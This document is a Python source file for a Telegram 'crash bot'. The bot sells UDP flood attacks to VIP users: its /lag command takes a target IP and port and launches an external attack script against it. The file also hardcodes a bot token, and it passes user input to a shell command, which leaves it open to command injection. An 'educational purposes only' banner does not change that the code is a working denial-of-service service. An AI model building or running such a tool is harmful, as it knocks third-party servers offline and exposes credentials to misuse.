import telebot
import os
import signal
import subprocess
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Telegram Bot Token
TOKEN = "8169647707:AAEtsBvZwY67VqnSGcpsgQz9-L6v79aW4uE"
bot = telebot.TeleBot(TOKEN)

# Allowed Admins to use specific commands
ALLOWED_USERS = [7179739121]  # Add Admin IDs here

# VIP Users and their remaining days (now defined as a dictionary)
vip_users = {7179739121: 30}  # Example: {user_id: days_left}

# Active attacks tracking
active_attacks = {}

@bot.message_handler(commands=['start'])
def handle_start_command(message):
    try:
        user_id = message.from_user.id
        days_left = vip_users.get(user_id, 0)  # Using .get() on a dictionary

        text = (
            f"🤖 *WELCOME TO THE CRASH BOT!*\n\n"
            f"✅ *YOUR STATUS:* {'VIP' if days_left > 0 else 'REGULAR USER'}\n"
            f"⏳ *DAYS REMAINING:* {days_left if days_left > 0 else 'N/A'}\n\n"
            f"📌 *HOW TO LAUNCH AN ATTACK:*\n"
            f"/lag <IP:PORT>\n\n"
            f"⚠️ *NOTE:* THIS BOT IS FOR EDUCATIONAL PURPOSES ONLY"
        )

        markup = InlineKeyboardMarkup()
        creator_button = InlineKeyboardButton("📱 CREATOR", url="t.me/S_DD_F")
        markup.add(creator_button)

        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")

@bot.message_handler(commands=['lag'])
def handle_lag_command(message):
    try:
        user_id = message.from_user.id

        if user_id not in ALLOWED_USERS and vip_users.get(user_id, 0) <= 0:
            bot.reply_to(message, "🚫 YOU MUST BE A VIP OR AN ALLOWED USER TO USE THIS COMMAND!")
            return

        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "⚠️ CORRECT USAGE: /lag <IP:PORT>", parse_mode="Markdown")
            return

        ip_port = command_parts[1]

        # التأكد من أن المدخل يحتوي على IP:PORT
        if ":" not in ip_port:
            bot.reply_to(message, "❌ INVALID FORMAT! PLEASE USE IP:PORT FORMAT.")
            return

        ip, port = ip_port.split(":")
        
        if not ip or not port.isdigit():
            bot.reply_to(message, "❌ INVALID IP OR PORT. PLEASE CHECK YOUR INPUT.")
            return

        attack_type = "UDP"  # نوع الهجوم الافتراضي
        threads = "100"  # عدد الـ Threads الافتراضي
        duration = "900"  # مدة الهجوم الافتراضية بالمللي ثانية

        command = f'python3 start.py {attack_type} {ip}:{port} {threads} {duration}'
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)

        if user_id not in active_attacks:
            active_attacks[user_id] = {}

        active_attacks[user_id][ip_port] = process

        response = (
            f"✅ *ATTACK LAUNCHED SUCCESSFULLY!*\n\n"
            f"📍 *TARGET:* {ip}:{port}\n"
            f"⚙️ *TYPE:* {attack_type}\n"
            f"🧵 *THREADS:* {threads}\n"
            f"⏳ *DURATION:* {duration}ms\n\n"
            f"🔴 *PRESS THE BUTTON BELOW TO STOP THE ATTACK.*"
        )

        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{ip_port}")
        markup.add(stop_button)

        bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_attack'))
def stop_attack(call):
    try:
        user_id = call.from_user.id
        ip_port = call.data.split("_")[2]

        if user_id not in active_attacks or ip_port not in active_attacks[user_id]:
            bot.answer_callback_query(call.id, "NO ACTIVE ATTACK FOUND FOR THIS TARGET!")
            return

        process = active_attacks[user_id][ip_port]
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)

        del active_attacks[user_id][ip_port]
        if not active_attacks[user_id]:
            del active_attacks[user_id]

        bot.answer_callback_query(call.id, "ATTACK STOPPED SUCCESSFULLY!")
        bot.send_message(call.message.chat.id, f"🛑 *ATTACK ON {ip_port} HAS BEEN STOPPED.*", parse_mode="Markdown")
    except Exception as e:
        bot.answer_callback_query(call.id, f"AN ERROR OCCURRED: {str(e)}")
        bot.send_message(call.message.chat.id, f"AN ERROR OCCURRED: {str(e)}")

@bot.message_handler(commands=['addvip'])
def handle_addvip_command(message):
    try:
        user_id = message.from_user.id

        if user_id not in ALLOWED_USERS:
            bot.reply_to(message, "🚫 YOU ARE NOT AUTHORIZED TO USE THIS COMMAND!")
            return

        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ CORRECT USAGE: /addvip <USER_ID> <DAYS>", parse_mode="Markdown")
            return

        new_vip_user_id = int(command_parts[1])
        days = int(command_parts[2])

        vip_users[new_vip_user_id] = days

        bot.reply_to(message, f"✅ USER {new_vip_user_id} HAS BEEN ADDED TO VIP FOR {days} DAYS.")
    except Exception as e:
        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")

print("BOT IS RUNNING...")
bot.polling()
